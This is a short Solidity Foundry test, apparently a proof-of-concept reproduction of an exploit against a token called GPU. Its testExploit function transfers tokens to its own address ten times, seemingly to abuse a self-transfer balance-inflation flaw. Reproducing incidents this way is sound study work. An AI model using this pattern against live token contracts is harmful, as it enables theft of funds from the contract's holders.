// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {GPUBaseTest} from "./GPUBase.t.sol";

contract GPUTest is GPUBaseTest {
    function testExploit() external validation {

        for(int i = 0; i < 10 ; i++)
        {
            //Transfer token 10 times
            token.transfer(address(this), 1 ether);
        }
    }
}